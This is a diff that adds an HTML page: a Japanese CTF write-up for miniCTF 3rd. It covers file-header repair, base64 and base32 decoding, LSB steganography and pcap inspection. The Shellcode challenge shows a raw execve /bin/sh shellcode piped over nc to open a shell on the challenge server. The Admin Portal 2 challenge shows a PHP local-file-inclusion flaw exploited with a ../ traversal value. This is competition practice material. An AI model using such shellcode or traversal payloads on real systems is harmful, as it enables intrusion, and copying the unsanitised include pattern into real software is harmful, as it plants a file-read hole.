@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html xmlns="//www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+    <head>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+        <title>miniCTF 3rd write-up &middot; $ sleep infinity</title>
+        <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:400,300,600' type='text/css'>
+        <link rel="stylesheet" href="https://arata-nvm.github.io//libraries/normalize.3.0.1.css" />
+        <link rel="stylesheet" href="https://arata-nvm.github.io//css/liquorice.css" />
+        <link rel="shortcut icon" href="/favicon.ico" />
+        <link rel="apple-touch-icon-precomposed" href="/apple-touch-icon-144-precomposed.png" sizes="144x144" />
+        </head>
+    <body class="li-body">
+
+<header class="li-page-header">
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <div class="li-brand li-left">
+                <a href="https://arata-nvm.github.io/">$ sleep infinity</a></div>
+                <div class="li-menu li-right">
+                    <span class="li-menu-icon" onclick="javascript:toggle('menu');">&#9776;</span>
+                    <ul id="menu2" class="li-menu-items">
+                        
+                            <li><a href="/about/"> About </a></li>
+                        
+                            <li><a href="/categories"> Categories </a></li>
+                        
+                            <li><a href="/post"> Posts </a></li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="sixteen columns">
+                <ul id="menu" class="li-menu-items li-menu-mobile">
+                    
+                        <li><a href="/about/"> About </a></li>
+                    
+                        <li><a href="/categories"> Categories </a></li>
+                    
+                        <li><a href="/post"> Posts </a></li>
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <article class="li-article">
+                    <header class="li-article-header">
+                        <h1 class="li-article-title">miniCTF 3rd write-up</h1>
+                        <span class="li-article-taxonomies">
+                            
+                                Posted in
+                                
+                                    <a href="https://arata-nvm.github.io//categories/write-up">write-up</a>
+                                
+                            
+
+                            
+                        </span>
+                         - 
+                        <time class="li-article-date">Friday, January 31, 2020</time>
+                    </header>
+                    <section>
+                        <p>ソロでチーム&quot;helix&quot;として参加した。1001 点を獲得し、順位は 9 位だった。</p>
+<h2 id="00-welcome">00 Welcome</h2>
+<p>自明</p>
+<p><code>NITAC{sup3r_dup3r_sc0re_serv3r}</code></p>
+<h2 id="01-signature">01 signature</h2>
+<p><code>signature</code>ファイルの中身を確認する。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file signature 
+signature: ELF <span style="color:#f92672">(</span>Tru64<span style="color:#f92672">)</span>, unknown class <span style="color:#ae81ff">13</span>
+
+$ xxd signature | head
+00000000: 7f45 4c46 0d0a 1a0a <span style="color:#ae81ff">0000</span> 000d <span style="color:#ae81ff">4948</span> <span style="color:#ae81ff">4452</span>  .ELF........IHDR
+00000010: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0423</span> <span style="color:#ae81ff">0000</span> 021d <span style="color:#ae81ff">0806</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0007</span> efb7  ...#............
+00000020: 2f00 <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0473</span> <span style="color:#ae81ff">4249</span> <span style="color:#ae81ff">5408</span> <span style="color:#ae81ff">0808</span> 087c <span style="color:#ae81ff">0864</span>  /....sBIT....|.d
+00000030: <span style="color:#ae81ff">8800</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">1974</span> <span style="color:#ae81ff">4558</span> <span style="color:#ae81ff">7453</span> 6f66 <span style="color:#ae81ff">7477</span> <span style="color:#ae81ff">6172</span>  .....tEXtSoftwar
+00000040: <span style="color:#ae81ff">6500</span> 676e 6f6d 652d <span style="color:#ae81ff">7363</span> <span style="color:#ae81ff">7265</span> 656e <span style="color:#ae81ff">7368</span>  e.gnome-screensh
+00000050: 6f74 ef03 bf3e <span style="color:#ae81ff">0000</span> 1c96 <span style="color:#ae81ff">4944</span> <span style="color:#ae81ff">4154</span> 789c  ot...&gt;....IDATx.
+00000060: eddd 39b2 eb46 <span style="color:#ae81ff">8205</span> <span style="color:#ae81ff">5042</span> f1b7 <span style="color:#ae81ff">2347</span> a6ca  ..9..F..PB..#G..
+00000070: d652 2ab4 <span style="color:#ae81ff">2679</span> b595 72e4 7d4b 0ba8 4db4  .R*.&amp;y..r.<span style="color:#f92672">}</span>K..M.
+00000080: cf36 a427 bd91 c490 <span style="color:#ae81ff">7973</span> 3a27 a28c 16fa  .6.<span style="color:#e6db74">&#39;....ys:&#39;</span>....
+00000090: f381 891c 2f13 c0f6 cb2f bfdc 6f00 <span style="color:#ae81ff">0000</span>  ..../..../..o...
+</code></pre></div><p>識別子は<code>ELF</code>だが<code>IHDR</code>や<code>IDAT</code>の文字からpngっぽいということで<code>7f45 4c46</code>を<code>8950 4e47</code>に変えるとフラグが手に入る。</p>
+<p><code>NITAC{dr4win9}</code></p>
+<h2 id="02-shellcode">02 shellcode</h2>
+<p><code>shellcode</code>ファイルの中身を確認する。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file shellcode 
+shellcode: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]</span><span style="color:#f92672">=</span>3658bbbb3a87143505daa8ebe8bc00220aa93cc1, not stripped
+</code></pre></div><p>問題名から察したので<a href="http://shell-storm.org">http://shell-storm.org</a>から<code>x86-64</code>用のシェルコードを適当に探して投げてみる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#34;</span>;cat<span style="color:#f92672">)</span> | nc &lt;url&gt;
+I will execute your code instead of you. Give me machine code bytes: ls
+flag.txt
+redir.sh
+shellcode
+cat flag.txt
+NITAC<span style="color:#f92672">{</span>I_g4ve_up_cr0ss_comp1ling<span style="color:#f92672">}</span>
+</code></pre></div><p>フラグが手に入る。</p>
+<p><code>NITAC{I_g4ve_up_cr0ss_comp1ling}</code></p>
+<h2 id="03-wrong-copy">03 wrong copy</h2>
+<p><code>program</code>ファイルの中身を確認する。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file program
+program: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]</span><span style="color:#f92672">=</span>007c9b3494e08ccacaf16692de872fe3b817ae26, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
+</code></pre></div><p>とりあえず<code>strings</code>をかけてみる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings program
+... <span style="color:#f92672">(</span>省略<span style="color:#f92672">)</span>
+u+UH
+NITAC<span style="color:#f92672">{</span>c0H
+py_15_d1H
+ff1cul7<span style="color:#f92672">}</span>
+<span style="color:#f92672">[</span><span style="color:#f92672">]</span>A<span style="color:#ae81ff">\A</span><span style="color:#f92672">]</span>A^A_
+... <span style="color:#f92672">(</span>省略<span style="color:#f92672">)</span>
+</code></pre></div><p>それっぽい文字列が見つかるが<code>H</code>が途中に混ざっているので除去するとフラグが手に入る。</p>
+<p><code>NITAC{c0py_15_d1ff1cul7}</code></p>
+<h2 id="08-base64">08 base64</h2>
+<p><code>encoded.txt</code>ファイルの中身を確認する。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat encoded.txt
+TklUQUN7RE9fWU9VX0tOT1dfQkFTRTY0P30K
+</code></pre></div><p>問題文に従って、デコードする。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat encoded.txt | base64 -d
+NITAC<span style="color:#f92672">{</span>DO_YOU_KNOW_BASE64?<span style="color:#f92672">}</span>
+</code></pre></div><p>フラグが得られる。</p>
+<p><code>NITAC{DO_YOU_KNOW_BASE64?}</code></p>
+<h2 id="12-flower">12 flower</h2>
+<p>暗号化スクリプト<code>encrypt.py</code>と、ファイル<code>flower.png</code> 、<code>enc_flower.png</code>が渡される。</p>
+<p><code>encrypt.py</code>を確認する。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> cv2
+<span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
+
+img <span style="color:#f92672">=</span> cv2<span style="color:#f92672">.</span>imread(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">flower.png</span><span style="color:#e6db74">&#39;</span>)
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([bin(ord(x))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> list(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">input flag: </span><span style="color:#e6db74">&#34;</span>))])
+flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (img<span style="color:#f92672">.</span>shape[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> img<span style="color:#f92672">.</span>shape[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> img<span style="color:#f92672">.</span>shape[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> len(flag))
+
+<span style="color:#66d9ef">print</span>(flag)
+<span style="color:#66d9ef">print</span>(len(flag))
+
+enc_img <span style="color:#f92672">=</span> []
+
+cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> img:
+    img_line <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        r, g, b <span style="color:#f92672">=</span> [[y <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> list(bin(x)[<span style="color:#ae81ff">2</span>:])] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> j]
+        r[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> flag[cnt]
+        g[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> flag[cnt <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
+        b[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> flag[cnt <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]
+        cnt <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+        img_line<span style="color:#f92672">.</span>append([int(x, <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(r), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(g), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(b)]])
+    enc_img<span style="color:#f92672">.</span>append(img_line)
+cv2<span style="color:#f92672">.</span>imwrite(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">enc_flower.png</span><span style="color:#e6db74">&#39;</span>, np<span style="color:#f92672">.</span>array(enc_img))
+</code></pre></div><p>面倒くさかったので、脳死で復号スクリプトを書いた。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> cv2
+
+img <span style="color:#f92672">=</span> cv2<span style="color:#f92672">.</span>imread(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">enc_flower.png</span><span style="color:#e6db74">&#39;</span>)
+
+flag <span style="color:#f92672">=</span> []
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> img:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        r, g, b <span style="color:#f92672">=</span> [[y <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> list(bin(x)[<span style="color:#ae81ff">2</span>:])] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> j]
+        flag<span style="color:#f92672">.</span>append(r[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+        flag<span style="color:#f92672">.</span>append(g[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+        flag<span style="color:#f92672">.</span>append(b[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(flag), <span style="color:#ae81ff">8</span>):
+    <span style="color:#66d9ef">print</span>(chr(int(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(flag[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]), <span style="color:#ae81ff">2</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>実行するとフラグが手に入る。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python decrypt.py | less
+NITAC<span style="color:#f92672">{</span>LSB_full_search<span style="color:#f92672">}</span>^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+lines 1-1/1 <span style="color:#f92672">(</span>END<span style="color:#f92672">)</span>
+</code></pre></div><p><code>NITAC{LSB_full_search}</code></p>
+<h2 id="15-teachers-server">15 Teacher's Server</h2>
+<p>フラグが<code>base32</code>で暗号化されているとのことなので、<code>Network1.pcapng</code>を<code>strings</code>にかけてみる</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings Network1.pcapng
+... <span style="color:#f92672">(</span>省略<span style="color:#f92672">)</span>
+Date: Sat, <span style="color:#ae81ff">28</span> Dec <span style="color:#ae81ff">2019</span> 07:20:42 GMT
+Connection: keep-alive
+flag: JZEVIQKDPNEVGQKPL5EVGX2NIFKEQRKNIFKESQ2JIFHH2<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
+Counters provided by dumpcap
+</code></pre></div><p>いかにもな文字列を見つけたのでデコードする。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo JZEVIQKDPNEVGQKPL5EVGX2NIFKEQRKNIFKESQ2JIFHH2<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span> | base32 -d
+NITAC<span style="color:#f92672">{</span>ISAO_IS_MATHEMATICIAN<span style="color:#f92672">}</span>
+</code></pre></div><p>フラグが手に入る。</p>
+<h2 id="17-admin-portal-1">17 Admin Portal 1</h2>
+<p>Webサイトのソースが渡される。サイトには登録のためのリンクがないが、ソースを読むと<code>register.php</code>で受け付けていることがわかるので適当に登録する。その後、サイトからログインするとフラグが表示されている。</p>
+<p><code>NITAC{00f_r3g1str4t10n_st1ll_w0rks}</code></p>
+<h2 id="18-admin-portal-2">18 Admin Portal 2</h2>
+<p>ソースを更に読むと、<code>index.php</code>に以下のようなコードがあることに気づく。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;templates/&#34;</span> <span style="color:#f92672">.</span> $_GET[<span style="color:#e6db74">&#39;lang&#39;</span>]); <span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>このコードを利用すると<code>lang</code>パラメータの変更で好きなファイルを読むことができる。また問題文より、フラグは<code>/flag2.txt</code>に存在することがわかっている。</p>
+<p>そこで<code>lang</code>パラメータに適当な値を入力していくと、<code>../../../../flag2.txt</code>でフラグを手に入れることができた。</p>
+<p><code>NITAC{n0w_u_kn0w_h0w_LFI_w0rks}</code></p>
+<h2 id="jwt-auth">JWT auth</h2>
+<p>メモを取り忘れたので省略。</p>
+<h2 id="総括">総括</h2>
+<p>自明問題しか解けていないように感じた。</p>
+
+                    </section>
+                </article>
+            </div>
+        </div>
+
+        <div class="row li-author">
+    <div class="sixteen columns">
+        Written by <strong>arata-nvm</strong>
+    </div>
+</div>
+
+
+        <div class="row li-pagination">
+            <div class="eight columns">
+                <div class="li-pagination-previous">
+                    
+                        Later article<br />
+                        <a href="https://arata-nvm.github.io/blog/2019/11/16/sckosen_2019_writeup/"> SCKOSEN 2019 write-up</a>
+                    
+                </div>
+            </div>
+            <div class="eight columns">
+                <div class="li-pagination-next">
+                    
+                        &nbsp;
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+<footer class="li-page-footer">
+    <div class="container">
+        <div class="row">
+            <div class="sixteen columns">
+                <div class="li-page-footer-legal">
+                    &copy; 2020. All rights reserved. 
+                </div>
+                <div class="li-page-footer-theme">
+                    <span class=""><a href="https://github.com/eliasson/liquorice/">liquorice</a> is a theme for <a href="http://hugo.spf13.com">hugo</a></span>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script type="text/javascript">
+    <!--
+    function toggle(id) {
+        var e = document.getElementById(id);
+        e.style.display == 'block' ? e.style.display = 'none' : e.style.display = 'block';
+    }
+    
+    </script>
+    
+    </body>
+</html>
+
